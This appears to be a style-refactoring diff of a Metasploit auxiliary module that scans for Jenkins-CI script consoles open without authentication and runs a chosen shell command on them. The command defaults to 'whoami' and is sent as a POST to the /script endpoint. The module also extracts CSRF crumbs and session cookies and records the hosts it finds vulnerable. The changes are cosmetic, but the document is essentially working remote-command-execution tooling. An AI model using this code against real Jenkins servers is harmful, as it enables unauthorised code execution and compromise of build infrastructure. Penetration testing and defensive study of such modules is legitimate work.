@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,43 +9,42 @@ require 'msf/core'
 require 'cgi'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',
-      'Description' => %q{
-        This module scans for unauthenticated Jenkins-CI script consoles and
-        executes the specified command.
-      },
-      'Author'      =>
-        [
-          'altonjx',
-          'Jeffrey Cap'
-        ],
-      'References'  =>
-        [
-          ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
-          ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console'],
-        ],
-      'License'     => MSF_LICENSE
-      ))
+                      'Name'        => 'Jenkins-CI Unauthenticated Script-Console Scanner',
+                      'Description' => %q(
+                        This module scans for unauthenticated Jenkins-CI script consoles and
+                        executes the specified command.
+                      ),
+                      'Author'      =>
+                        [
+                          'altonjx',
+                          'Jeffrey Cap'
+                        ],
+                      'References'  =>
+                        [
+                          ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
+                          ['URL', 'https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console']
+                        ],
+                      'License'     => MSF_LICENSE))
 
     register_options(
       [
         OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ]),
-        OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ]),
-      ], self.class)
+        OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ])
+      ], self.class
+    )
   end
 
-  def fingerprint_os(ip)
-    res = send_request_cgi({'uri' => normalize_uri(target_uri.path,"systemInfo")})
+  def fingerprint_os(_ip)
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path, "systemInfo"))
 
     # Verify that we received a proper systemInfo response
-    unless res && res.body.to_s.length > 0
+    unless res && !res.body.to_s.empty?
       vprint_error("#{peer} - The server did not reply to our systemInfo request")
       return
     end
@@ -60,12 +60,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     host_info = {}
-    if (res.body =~ /"\.crumb", "([a-z0-9]*)"/)
-      print_status("#{peer} Using CSRF token: '#{$1}'")
-      host_info[:crumb] = $1
+    if res.body =~ /"\.crumb", "([a-z0-9]*)"/
+      print_status("#{peer} Using CSRF token: '#{Regexp.last_match(1)}'")
+      host_info[:crumb] = Regexp.last_match(1)
 
       sessionid = 'JSESSIONID' << res.get_cookies.split('JSESSIONID')[1].split('; ')[0]
-      host_info[:cookie] = "#{sessionid}"
+      host_info[:cookie] = sessionid.to_s
     end
 
     os_info = pattern_extract(/os.name(.*?)os.version/m, res.body).first
@@ -81,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
     prefix = host_info[:prefix]
 
     request_parameters = {
-      'uri'       => normalize_uri(target_uri.path,"script"),
+      'uri'       => normalize_uri(target_uri.path, "script"),
       'method'    => 'POST',
       'ctype'     => 'application/x-www-form-urlencoded',
       'vars_post' =>
@@ -94,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
     request_parameters['vars_post']['.crumb'] = host_info[:crumb] unless host_info[:crumb].nil?
     res = send_request_cgi(request_parameters)
 
-    unless res && res.body.to_s.length > 0
+    unless res && !res.body.to_s.empty?
       vprint_error("#{peer} No response received from the server.")
       return
     end
@@ -107,12 +107,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # The output is double-HTML encoded
-    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s)).
-             gsub(/\s*(out|err)>\s*/m, '').
-             strip
+    output = CGI.unescapeHTML(CGI.unescapeHTML(command_output.to_s))
+                .gsub(/\s*(out|err)>\s*/m, '')
+                .strip
 
     if output =~ /^java\.[a-zA-Z\.]+\:\s*([^\n]+)\n/
-      output = $1
+      output = Regexp.last_match(1)
       print_good("#{peer} The server is vulnerable, but the command failed: #{output}")
     else
       output.split("\n").each do |line|
@@ -121,23 +121,22 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     report_vulnerable(output)
-
   end
 
   def pattern_extract(pattern, buffer)
-    buffer.to_s.scan(pattern).map{ |m| m.first }
+    buffer.to_s.scan(pattern).map(&:first)
   end
 
   def report_vulnerable(result)
     report_vuln(
-      :host   => rhost,
-      :port   => rport,
-      :proto  => 'tcp',
-      :sname  => ssl ? 'https' : 'http',
-      :name   => self.name,
-      :info   => result,
-      :refs   => self.references,
-      :exploited_at => Time.now.utc
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      sname: ssl ? 'https' : 'http',
+      name: name,
+      info: result,
+      refs: references,
+      exploited_at: Time.now.utc
     )
   end
 end
